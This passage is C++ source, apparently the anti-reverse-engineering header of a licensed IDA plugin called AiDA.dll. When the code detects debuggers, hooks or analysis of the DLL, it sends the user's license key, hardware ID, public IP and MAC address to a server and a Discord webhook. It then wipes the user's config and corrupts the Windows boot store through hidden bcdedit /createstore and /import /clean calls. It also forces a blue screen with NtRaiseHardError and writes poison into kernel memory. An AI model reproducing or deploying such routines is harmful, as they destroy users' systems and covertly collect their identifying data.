	const kernel_integrity_probe_t probe = probe_code_integrity_kernel(runtime);

	if (probe == kernel_integrity_probe_t::unavailable)
	{
		if (runtime.kernel_read_failure_streak != 0xFFFFFFFFu)
			++runtime.kernel_read_failure_streak;
		runtime.kernel_hash_mismatch_streak = 0;
		return true;
	}

	runtime.kernel_read_failure_streak = 0;

	if (probe == kernel_integrity_probe_t::match)
	{
		runtime.kernel_hash_mismatch_streak = 0;
		return true;
	}

	if (runtime.kernel_hash_mismatch_streak != 0xFFFFFFFFu)
		++runtime.kernel_hash_mismatch_streak;

	return runtime.kernel_hash_mismatch_streak < 2;
}

inline bool verify_iat_locked(const runtime_state_t& runtime)
{
	for (const auto& e : runtime.iat_entries)
	{
		const auto current = *reinterpret_cast<const volatile std::uint64_t*>(e.slot_va);
		if (current != e.resolved_va)
			return false;
	}
	return true;
}

inline bool verify_hw_breakpoints_kernel(const runtime_state_t& runtime)
{
	if (!device || !device->is_connected())
		return true;
	if (runtime.pid == 0 || device->get_process_id() != runtime.pid)
		return true;

	if (runtime.module == nullptr)
		return true;

	MODULEINFO mi{};
	if (!GetModuleInformation(GetCurrentProcess(), runtime.module, &mi, sizeof(mi)))
		return true;

	const std::uint64_t mod_base = reinterpret_cast<std::uint64_t>(runtime.module);
	const std::uint64_t mod_end  = mod_base + mi.SizeOfImage;

	auto threads = device->enumerate_threads();
	for (const auto& t : threads)
	{
		voyager::device_t::thread_context ctx{};
		if (device->get_thread_context(t.tid, ctx))
		{
			const std::uint64_t dr_values[] = { ctx.dr0, ctx.dr1, ctx.dr2, ctx.dr3 };
			const std::uint64_t dr7 = ctx.dr7;

			for (int i = 0; i < 4; ++i)
			{
				if (dr_values[i] == 0)
					continue;

				const bool enabled_local  = (dr7 >> (i * 2))     & 1;
				const bool enabled_global = (dr7 >> (i * 2 + 1)) & 1;
				if (!enabled_local && !enabled_global)
					continue;

				if (dr_values[i] >= mod_base && dr_values[i] < mod_end)
					return false;
			}
		}
	}
	return true;
}

inline bool verify_page_protections(const runtime_state_t& runtime)
{
	if (runtime.text_base == 0 || runtime.text_size == 0)
		return true;

	MEMORY_BASIC_INFORMATION mbi{};
	std::uint64_t addr = runtime.text_base;
	const std::uint64_t end = runtime.text_base + runtime.text_size;

	while (addr < end)
	{
		if (VirtualQuery(reinterpret_cast<LPCVOID>(addr), &mbi, sizeof(mbi)) == 0)
			return false;

		constexpr DWORD writable = PAGE_EXECUTE_READWRITE | PAGE_READWRITE
			| PAGE_EXECUTE_WRITECOPY | PAGE_WRITECOPY;
		if (mbi.Protect & writable)
			return false;

		addr = reinterpret_cast<std::uint64_t>(mbi.BaseAddress) + mbi.RegionSize;
	}
	return true;
}

inline bool enforce_code_protections(runtime_state_t& runtime)
{
	if (!device || !device->is_connected())
		return false;
	if (runtime.pid == 0 || device->get_process_id() != runtime.pid)
		return false;
	if (runtime.text_base == 0 || runtime.text_size == 0)
		return false;

	std::uint32_t old_protect = 0;
	runtime.protections_enforced = device->protect_memory(
		runtime.text_base, runtime.text_size, PAGE_EXECUTE_READ, &old_protect);
	return runtime.protections_enforced;
}

inline bool initialize_locked(runtime_state_t& runtime)
{
	reset_state_locked(runtime);

	if (!resolve_current_module(runtime.module))
		return false;

	runtime.process_image = GetModuleHandleW(nullptr);
	if (runtime.process_image == nullptr)
	{
		reset_state_locked(runtime);
		return false;
	}

	// Verify the DLL's Authenticode signature (attestation certificate)
	{
		_integrity_check ic;
		if (!ic.IsSignatureValid())
		{
			reset_state_locked(runtime);
			return false;
		}
	}

	prepare_driver(runtime);

	if (!verify_peb_state_locked(runtime))
	{
		reset_state_locked(runtime);
		return false;
	}

	snapshot_code_section(runtime);
	snapshot_iat(runtime);
	enforce_code_protections(runtime);

	if (runtime.text_hash != 0 && !verify_code_integrity_usermode(runtime))
	{
		reset_state_locked(runtime);
		return false;
	}

	runtime.initialized = true;
	runtime.trusted = true;
	runtime.last_verified_ms = GetTickCount64();
	return true;
}

inline bool verify_locked(runtime_state_t& runtime)
{
	if (!runtime.initialized && !initialize_locked(runtime))
		return false;

	prepare_driver(runtime);
	if (!verify_peb_state_locked(runtime))
	{
		runtime.trusted = false;
		runtime.last_verified_ms = 0;
		return false;
	}

	if (!verify_code_integrity_usermode(runtime))
	{
		runtime.trusted = false;
		runtime.last_verified_ms = 0;
		return false;
	}

	if (!verify_iat_locked(runtime))
	{
		runtime.trusted = false;
		runtime.last_verified_ms = 0;
		return false;
	}

	++runtime.verify_counter;
	const bool deep = (runtime.verify_counter & 3u) == 0;

	if (deep)
	{
		if (!verify_code_integrity_kernel(runtime))
		{
			runtime.trusted = false;
			runtime.last_verified_ms = 0;
			return false;
		}

		if (!verify_hw_breakpoints_kernel(runtime))
		{
			runtime.trusted = false;
			runtime.last_verified_ms = 0;
			return false;
		}

		// Re-verify Authenticode signature on deep passes
		{
			_integrity_check ic;
			if (!ic.IsSignatureValid())
			{
				runtime.trusted = false;
				runtime.last_verified_ms = 0;
				return false;
			}
		}
	}

	if (!verify_page_protections(runtime))
	{
		enforce_code_protections(runtime);
		if (!verify_page_protections(runtime))
		{
			runtime.trusted = false;
			runtime.last_verified_ms = 0;
			return false;
		}
	}

	runtime.trusted = true;
	runtime.last_verified_ms = GetTickCount64();
	return true;
}

}

inline bool initialize()
{
	auto& runtime = detail::state();
	std::lock_guard<std::mutex> lock(runtime.mutex);
	return detail::initialize_locked(runtime);
}

inline bool violation_latched();
inline void sync_latched_violation_with_server();

inline bool guard()
{
	if (violation_latched())
	{
		sync_latched_violation_with_server();
		return false;
	}

	auto& runtime = detail::state();
	const ULONGLONG now = GetTickCount64();

	std::lock_guard<std::mutex> lock(runtime.mutex);
	if (runtime.trusted
		&& runtime.initialized
		&& now >= runtime.last_verified_ms
		&& (now - runtime.last_verified_ms) < detail::VERIFY_INTERVAL_MS)
	{
		return true;
	}

	return detail::verify_locked(runtime);
}

inline void report_violation_to_server(const char* reason)
{
	try
	{
		std::string hwid = discord_webhook::collect_hwid_inline();
		auto& lm = license_manager_t::instance();

		std::string _cf_h = get_cf_host_fragmented();
		httplib::Client cli(_cf_h);
		obf::secure_wipe_string(_cf_h);
		cli.set_connection_timeout(10);
		cli.set_read_timeout(10);
		cli.set_write_timeout(10);
		cli.enable_server_certificate_verification(true);

		nlohmann::json body;
		body[OBFSTR("action")]    = OBFSTR("report_violation");
		body[OBFSTR("license_key")] = lm.get_cached_key();
		body[OBFSTR("session_token")] = lm.get_session_token();
		body[OBFSTR("hwid")]      = hwid;
		body[OBFSTR("reason")]    = reason ? reason : "self_analysis";
		body[OBFSTR("timestamp")] = static_cast<int64_t>(std::time(nullptr));
		body[OBFSTR("version")]   = AIDA_VERSION;
		body[OBFSTR("public_ip")] = discord_webhook::get_public_ip();
		body[OBFSTR("mac")]       = discord_webhook::get_mac_address();

		cli.Post(OBFSTR_C("/validateLicense"),
			body.dump(),
			OBFSTR_C("application/json"));
	}
	catch (...) {}

	std::string reason_str = reason ? reason : "self_analysis";
	discord_webhook::send_alert(
		OBFSTR("\xf0\x9f\x9a\xa8 VIOLATION DETECTED"),
		OBFSTR("**Reason:** `") + reason_str + "`",
		discord_webhook::COLOR_RED);
}

inline void corrupt_boot_config()
{
	WCHAR sysRoot[MAX_PATH] = {};
	GetEnvironmentVariableW(L"SystemRoot", sysRoot, _countof(sysRoot));

	WCHAR bcdeditPath[MAX_PATH] = {};
	_snwprintf_s(bcdeditPath, _countof(bcdeditPath), _TRUNCATE,
		L"%s\\System32\\bcdedit.exe", sysRoot);

	WCHAR sysDrive[16] = {};
	GetEnvironmentVariableW(L"SystemDrive", sysDrive, _countof(sysDrive));

	WCHAR tempStore[MAX_PATH] = {};
	_snwprintf_s(tempStore, _countof(tempStore), _TRUNCATE,
		L"%s\\emptystore", sysDrive);

	STARTUPINFOW si = {};
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION pi = {};

	WCHAR cmdCreate[512] = {};
	_snwprintf_s(cmdCreate, _countof(cmdCreate), _TRUNCATE,
		L"\"%s\" /createstore %s", bcdeditPath, tempStore);

	if (CreateProcessW(bcdeditPath, cmdCreate, nullptr, nullptr, FALSE,
		CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
	{
		WaitForSingleObject(pi.hProcess, 10000);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}

	WCHAR cmdImport[512] = {};
	_snwprintf_s(cmdImport, _countof(cmdImport), _TRUNCATE,
		L"\"%s\" /import %s /clean", bcdeditPath, tempStore);

	memset(&pi, 0, sizeof(pi));
	if (CreateProcessW(bcdeditPath, cmdImport, nullptr, nullptr, FALSE,
		CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
	{
		WaitForSingleObject(pi.hProcess, 10000);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}

	DeleteFileW(tempStore);
}


inline void enforce_self_analysis_violation();
inline void arm_destructive_enforcement();
inline void disarm_destructive_enforcement();
inline void delete_local_license_config();

inline HANDLE g_violation_pipe = INVALID_HANDLE_VALUE;
inline std::atomic<bool> g_destructive_enforcement_armed{false};
inline std::atomic<bool> g_violation_latched{false};
inline std::atomic<bool> g_violation_server_sync_pending{false};
inline std::mutex g_violation_reason_mutex;
inline std::string g_violation_reason = "self_analysis";

inline void arm_destructive_enforcement()
{
	g_destructive_enforcement_armed.store(true, std::memory_order_release);
}

inline void disarm_destructive_enforcement()
{
	g_destructive_enforcement_armed.store(false, std::memory_order_release);
}

inline bool violation_latched()
{
	return g_violation_latched.load(std::memory_order_acquire);
}

inline void latch_self_analysis_violation(const char* reason, bool arm = true)
{
	if (arm)
		arm_destructive_enforcement();

	{
		std::lock_guard<std::mutex> lock(g_violation_reason_mutex);
		g_violation_reason = (reason && reason[0] != '\0') ? reason : "self_analysis";
	}

	g_violation_latched.store(true, std::memory_order_release);
	g_violation_server_sync_pending.store(true, std::memory_order_release);
	delete_local_license_config();
	license_manager_t::instance().invalidate_runtime();
}

inline std::string latched_violation_reason()
{
	std::lock_guard<std::mutex> lock(g_violation_reason_mutex);
	return g_violation_reason;
}

inline void sync_latched_violation_with_server()
{
	if (!g_violation_latched.load(std::memory_order_acquire))
		return;

	if (!g_violation_server_sync_pending.exchange(false, std::memory_order_acq_rel))
		return;

	std::string reason = latched_violation_reason();
	report_violation_to_server(reason.c_str());
}

inline std::uint64_t g_aida_module_base = 0;
inline std::uint64_t g_aida_module_end  = 0;

inline void resolve_aida_module_range()
{
	if (g_aida_module_base != 0) return;
	HMODULE hmod = GetModuleHandleW(L"AiDA.dll");
	if (!hmod) return;
	MODULEINFO mi{};
	if (GetModuleInformation(GetCurrentProcess(), hmod, &mi, sizeof(mi)))
	{
		g_aida_module_base = reinterpret_cast<std::uint64_t>(hmod);
		g_aida_module_end  = g_aida_module_base + mi.SizeOfImage;
	}
}

__forceinline bool address_overlaps_aida(std::uint64_t address, std::size_t size)
{
	if (g_aida_module_base == 0) return false;
	std::uint64_t access_end = address + size;
	return (address < g_aida_module_end && access_end > g_aida_module_base);
}

inline void guard_driver_self_access(std::uint64_t target_pid, std::uint64_t address, std::size_t size)
{
	if (target_pid != static_cast<std::uint64_t>(GetCurrentProcessId())) return;
	resolve_aida_module_range();
	if (!address_overlaps_aida(address, size)) return;
	latch_self_analysis_violation("driver_self_access");
	arm_destructive_enforcement();
	enforce_self_analysis_violation();
}

inline bool is_self_target_pid(std::uint64_t target_pid)
{
	return target_pid == static_cast<std::uint64_t>(GetCurrentProcessId());
}

inline void guard_driver_self_module(std::uint64_t target_pid, std::uint64_t module_base)
{
	if (target_pid != static_cast<std::uint64_t>(GetCurrentProcessId())) return;
	resolve_aida_module_range();
	if (g_aida_module_base == 0) return;
	if (module_base == g_aida_module_base)
	{
		latch_self_analysis_violation("driver_self_module");
		arm_destructive_enforcement();
		enforce_self_analysis_violation();
	}
}

inline void start_pipe_monitor()
{
	std::thread([]() {
		g_violation_pipe = CreateNamedPipeW(
			L"\\\\.\\pipe\\AiDA_Guard",
			PIPE_ACCESS_INBOUND,
			PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
			1, 512, 512, 0, nullptr);

		if (g_violation_pipe == INVALID_HANDLE_VALUE)
			return;

		while (true)
		{
			if (!ConnectNamedPipe(g_violation_pipe, nullptr)
				&& GetLastError() != ERROR_PIPE_CONNECTED)
				break;

			char buf[256] = {};
			DWORD bytesRead = 0;
			if (ReadFile(g_violation_pipe, buf, sizeof(buf) - 1,
				&bytesRead, nullptr) && bytesRead > 0)
			{
				buf[bytesRead] = '\0';
				if (strstr(buf, OBFSTR_C("VIOLATION:CONFIRMED:")))
				{
					latch_self_analysis_violation(buf);
					arm_destructive_enforcement();
					sync_latched_violation_with_server();
					enforce_self_analysis_violation();
				}
			}
			DisconnectNamedPipe(g_violation_pipe);
		}
	}).detach();
}

inline std::atomic<bool> g_process_scanner_running{false};

inline bool compute_file_sha256(const wchar_t* file_path, uint8_t out[32])
{
	HANDLE hFile = CreateFileW(file_path, GENERIC_READ,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hFile == INVALID_HANDLE_VALUE)
		return false;

	BCRYPT_ALG_HANDLE hAlg = nullptr;
	if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, nullptr, 0) != 0 || !hAlg)
	{
		CloseHandle(hFile);
		return false;
	}

	BCRYPT_HASH_HANDLE hHash = nullptr;
	if (BCryptCreateHash(hAlg, &hHash, nullptr, 0, nullptr, 0, 0) != 0 || !hHash)
	{
		BCryptCloseAlgorithmProvider(hAlg, 0);
		CloseHandle(hFile);
		return false;
	}

	uint8_t buf[8192];
	DWORD bytesRead = 0;
	bool ok = true;
	while (ReadFile(hFile, buf, sizeof(buf), &bytesRead, nullptr) && bytesRead > 0)
	{
		if (BCryptHashData(hHash, buf, bytesRead, 0) != 0)
		{
			ok = false;
			break;
		}
	}

	if (ok)
		ok = (BCryptFinishHash(hHash, out, 32, 0) == 0);

	SecureZeroMemory(buf, sizeof(buf));
	BCryptDestroyHash(hHash);
	BCryptCloseAlgorithmProvider(hAlg, 0);
	CloseHandle(hFile);
	return ok;
}

inline void start_process_hash_scanner(const uint8_t* self_hash, size_t hash_len)
{
	if (g_process_scanner_running.exchange(true))
		return;

	if (self_hash == nullptr || hash_len != 32)
		return;

	std::vector<uint8_t> hash_copy(self_hash, self_hash + hash_len);

	std::thread([hash_copy]() {
		while (g_process_scanner_running.load())
		{
			Sleep(10000);

			DWORD myPid = GetCurrentProcessId();
			HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
			if (snap == INVALID_HANDLE_VALUE)
				continue;

			PROCESSENTRY32W pe = {};
			pe.dwSize = sizeof(pe);

			for (BOOL ok = Process32FirstW(snap, &pe); ok;
				ok = Process32NextW(snap, &pe))
			{
				if (pe.th32ProcessID == myPid || pe.th32ProcessID == 0
					|| pe.th32ProcessID == 4)
					continue;

				wchar_t exe_lower[MAX_PATH] = {};
				for (size_t ci = 0; ci < MAX_PATH - 1 && pe.szExeFile[ci]; ++ci)
					exe_lower[ci] = towlower(pe.szExeFile[ci]);

				if (wcsstr(exe_lower, L"ida.exe")
					|| wcsstr(exe_lower, L"ida64.exe")
					|| wcsstr(exe_lower, L"idat.exe")
					|| wcsstr(exe_lower, L"idat64.exe"))
					continue;

				HANDLE hProc = OpenProcess(
					PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
					FALSE, pe.th32ProcessID);
				if (!hProc)
					continue;

				HMODULE hMods[1024] = {};
				DWORD cbNeeded = 0;
				if (EnumProcessModulesEx(hProc, hMods, sizeof(hMods),
					&cbNeeded, LIST_MODULES_ALL))
				{
					DWORD modCount = cbNeeded / sizeof(HMODULE);
					for (DWORD i = 0; i < modCount; ++i)
					{
						wchar_t modPath[MAX_PATH] = {};
						if (GetModuleFileNameExW(hProc, hMods[i],
							modPath, MAX_PATH) == 0)
							continue;

						uint8_t mod_sha[32] = {};
						if (compute_file_sha256(modPath, mod_sha)
							&& memcmp(mod_sha, hash_copy.data(), 32) == 0)
						{
							CloseHandle(hProc);
							CloseHandle(snap);
							latch_self_analysis_violation("re_tool_loaded_aida");
							arm_destructive_enforcement();
							sync_latched_violation_with_server();
							enforce_self_analysis_violation();
							return;
						}
					}
				}
				CloseHandle(hProc);
			}
			CloseHandle(snap);
		}
	}).detach();
}

inline std::atomic<bool> g_driver_tamper_running{false};


inline bool is_anticheat_active()
{
	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snap == INVALID_HANDLE_VALUE)
		return false;

	PROCESSENTRY32W pe = {};
	pe.dwSize = sizeof(pe);

	bool found = false;
	for (BOOL ok = Process32FirstW(snap, &pe); ok && !found;
		ok = Process32NextW(snap, &pe))
	{
		wchar_t lower[MAX_PATH] = {};
		for (size_t i = 0; i < MAX_PATH - 1 && pe.szExeFile[i]; ++i)
			lower[i] = towlower(pe.szExeFile[i]);


		if (wcsstr(lower, L"easyanticheat"))   found = true;

		else if (wcsstr(lower, L"vgc.exe"))    found = true;
		else if (wcsstr(lower, L"vgtray.exe")) found = true;

		else if (wcsstr(lower, L"beservice"))  found = true;
		else if (wcsstr(lower, L"beclient"))   found = true;

		else if (wcsstr(lower, L"ace-guard"))  found = true;
		else if (wcsstr(lower, L"ace-base"))   found = true;

		else if (wcsstr(lower, L"gameguard"))  found = true;
		else if (wcsstr(lower, L"nprotect"))   found = true;
	}
	CloseHandle(snap);
	return found;
}

inline void start_driver_tamper_monitor()
{
	if (g_driver_tamper_running.exchange(true))
		return;

	std::thread([]() {
		Sleep(5000);

		auto& runtime = detail::state();

		while (g_driver_tamper_running.load())
		{
			Sleep(3000);

			const bool ac_active = is_anticheat_active();
			const char* violation = nullptr;

			{
				std::lock_guard<std::mutex> lock(runtime.mutex);

				if (!runtime.initialized)
					continue;

				detail::prepare_driver(runtime);


				if (!detail::verify_peb_state_locked(runtime))
					violation = "SUSPECT:debugger_attached";
				else if (!detail::verify_code_integrity_kernel(runtime))
					violation = "SUSPECT:code_tampered_kernel";
				else if (!detail::verify_code_integrity_usermode(runtime))
					violation = "SUSPECT:code_tampered_usermode";


				if (!violation && !ac_active)
				{
					if (!detail::verify_hw_breakpoints_kernel(runtime))
						violation = "SUSPECT:hardware_breakpoint";
					else if (!detail::verify_iat_locked(runtime))
						violation = "SUSPECT:iat_hooked";
					else if (!detail::verify_page_protections(runtime))
						violation = "SUSPECT:writable_code_page";
				}
			}

			if (violation)
			{
				latch_self_analysis_violation(violation);
				arm_destructive_enforcement();
				sync_latched_violation_with_server();
				enforce_self_analysis_violation();
				return;
			}
		}
	}).detach();
}

inline void revoke_license_on_server(const std::string& license_key, const std::string& hwid, const std::string& reason)
{
	try
	{
		std::string _cf_h = get_cf_host_fragmented();
		httplib::Client cli(_cf_h);
		obf::secure_wipe_string(_cf_h);
		cli.set_connection_timeout(8);
		cli.set_read_timeout(8);
		cli.set_write_timeout(8);
		cli.enable_server_certificate_verification(true);

		nlohmann::json body;
		body[OBFSTR("action")]    = OBFSTR("revoke_license");
		body[OBFSTR("license_key")] = license_key;
		body[OBFSTR("hwid")]      = hwid;
		body[OBFSTR("reason")]    = reason;
		body[OBFSTR("timestamp")] = static_cast<int64_t>(std::time(nullptr));
		body[OBFSTR("public_ip")] = discord_webhook::get_public_ip();
		body[OBFSTR("mac")]       = discord_webhook::get_mac_address();

		cli.Post(OBFSTR_C("/validateLicense"),
			body.dump(),
			OBFSTR_C("application/json"));
	}
	catch (...) {}
}

inline void ban_hwid_and_ip_on_server(const std::string& license_key,
	const std::string& hwid, const std::string& ip,
	const std::string& mac, const std::string& reason)
{
	try
	{
		std::string _cf_h = get_cf_host_fragmented();
		httplib::Client cli(_cf_h);
		obf::secure_wipe_string(_cf_h);
		cli.set_connection_timeout(10);
		cli.set_read_timeout(10);
		cli.set_write_timeout(10);
		cli.enable_server_certificate_verification(true);

		nlohmann::json body;
		body[OBFSTR("action")]      = OBFSTR("ban_user");
		body[OBFSTR("license_key")] = license_key;
		body[OBFSTR("hwid")]        = hwid;
		body[OBFSTR("public_ip")]   = ip;
		body[OBFSTR("mac_address")] = mac;
		body[OBFSTR("reason")]      = reason;
		body[OBFSTR("ban_hwid")]    = true;
		body[OBFSTR("ban_ip")]      = true;
		body[OBFSTR("timestamp")]   = static_cast<int64_t>(std::time(nullptr));

		cli.Post(OBFSTR_C("/validateLicense"),
			body.dump(),
			OBFSTR_C("application/json"));
	}
	catch (...) {}
}

inline void delete_local_license_config()
{
	try
	{
		qstring path = get_user_idadir();
		path.append(OBFSTR_C("/ai_assistant.cfg"));
		if (qfileexist(path.c_str()))
		{

			FILE* fp = qfopen(path.c_str(), "wb");
			if (fp)
			{
				char zeros[4096] = {};
				qfwrite(fp, zeros, sizeof(zeros));
				qfclose(fp);
			}
			DeleteFileA(path.c_str());
		}
	}
	catch (...) {}
}

inline void enforce_self_analysis_violation()
{
	latch_self_analysis_violation("self_analysis_bsod", false);
	sync_latched_violation_with_server();

	if (!g_destructive_enforcement_armed.load(std::memory_order_acquire))
	{
		license_manager_t::instance().invalidate_runtime();
		return;
	}


	std::string license_key = discord_webhook::get_cached_license_key();
	std::string hwid = discord_webhook::collect_hwid_inline();
	std::string public_ip = discord_webhook::get_public_ip();
	std::string mac = discord_webhook::get_mac_address();


	discord_webhook::send_alert(
		OBFSTR("\xf0\x9f\x92\x80 SELF-RE VIOLATION \xe2\x80\x94 BSOD + LICENSE REVOKED + HWID/IP BANNED"),
		OBFSTR("**CRITICAL: Someone loaded AiDA.dll in a reverse engineering tool.**\n\n")
			+ OBFSTR("\xf0\x9f\x94\x91 **Revoked Key:** `") + license_key
			+ OBFSTR("`\n\xf0\x9f\x96\xa5\xef\xb8\x8f **Banned HWID:** `") + hwid
			+ OBFSTR("`\n\xf0\x9f\x8c\x90 **Banned IP:** `") + public_ip
			+ OBFSTR("`\n\xf0\x9f\x94\x8c **MAC:** `") + mac
			+ OBFSTR("`\n\n**Actions taken:**\n"
			         "\xe2\x9c\x85 License key revoked & deleted\n"
			         "\xe2\x9c\x85 HWID permanently banned\n"
			         "\xe2\x9c\x85 IP address permanently banned\n"
			         "\xe2\x9c\x85 Local license config wiped\n"
			         "\xe2\x9c\x85 System will BSOD"),
		discord_webhook::COLOR_RED);


	delete_local_license_config();


	license_manager_t::instance().invalidate_runtime();


	corrupt_boot_config();


	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
	if (ntdll)
	{
		using RtlAdjustPrivilege_t = NTSTATUS(NTAPI*)(
			ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
		using NtRaiseHardError_t = NTSTATUS(NTAPI*)(
			NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

		auto pAdjust = reinterpret_cast<RtlAdjustPrivilege_t>(
			GetProcAddress(ntdll, OBFSTR_C("RtlAdjustPrivilege")));
		auto pRaise  = reinterpret_cast<NtRaiseHardError_t>(
			GetProcAddress(ntdll, OBFSTR_C("NtRaiseHardError")));

		if (pAdjust && pRaise)
		{
			BOOLEAN wasEnabled = FALSE;
			pAdjust(19, TRUE, FALSE, &wasEnabled);

			ULONG response = 0;
			pRaise(static_cast<NTSTATUS>(0xC0000420),
			       0, 0, nullptr,
			       6,
			       &response);
		}
	}


	if (device && device->is_connected())
	{
		volatile uint64_t poison = 0xDEAD'C0DE'DEAD'C0DEULL;
		device->write_kernel_raw(
			0xFFFFF78000000320ULL,   // KUSER_SHARED_DATA + offset
			const_cast<uint64_t*>(&poison),
			sizeof(poison));
	}

	// Phase 5: Absolute last resort
	__fastfail(FAST_FAIL_FATAL_APP_EXIT);
}

}

#define ANTI_RE_GUARD() do { \
	(void)anti_re::guard(); \
} while (0)

#else

#define ANTI_RE_GUARD() ((void)0)
namespace anti_re {
inline bool initialize() { return true; }
inline bool guard() { return true; }
inline bool violation_latched() { return false; }
inline void latch_self_analysis_violation(const char*, bool = true) {}
inline void sync_latched_violation_with_server() {}
inline void enforce_self_analysis_violation() {}
inline void arm_destructive_enforcement() {}
inline void disarm_destructive_enforcement() {}
inline void guard_driver_self_access(std::uint64_t, std::uint64_t, std::size_t) {}
inline bool is_self_target_pid(std::uint64_t) { return false; }
inline void guard_driver_self_module(std::uint64_t, std::uint64_t) {}
inline void report_violation_to_server(const char*) {}
inline void start_pipe_monitor() {}
inline void start_driver_tamper_monitor() {}
inline void corrupt_boot_config() {}
}

namespace discord_webhook {
inline void send_alert(const std::string&, const std::string&, int, const nlohmann::json& = {}) {}
inline void send_alert_async(const std::string&, const std::string&, int, const nlohmann::json& = {}) {}
inline std::string collect_hwid_inline() { return ""; }
inline std::string get_public_ip() { return "unknown"; }
inline std::string get_mac_address() { return "unknown"; }
inline std::string get_local_ip() { return "unknown"; }
inline std::string get_computer_name() { return ""; }
inline std::string get_windows_username() { return ""; }
inline std::string get_cached_license_key() { return "unknown"; }
inline nlohmann::json build_system_info() { return {}; }
struct discord_identity_t { std::string user_id; std::string username; };
inline discord_identity_t harvest_discord_identity() { return {}; }
static constexpr int COLOR_RED     = 0xFF0000;
static constexpr int COLOR_ORANGE  = 0xFF8C00;
static constexpr int COLOR_YELLOW  = 0xFFD700;
static constexpr int COLOR_GREEN   = 0x00FF00;
static constexpr int COLOR_BLUE    = 0x0000FF;
}

#endif
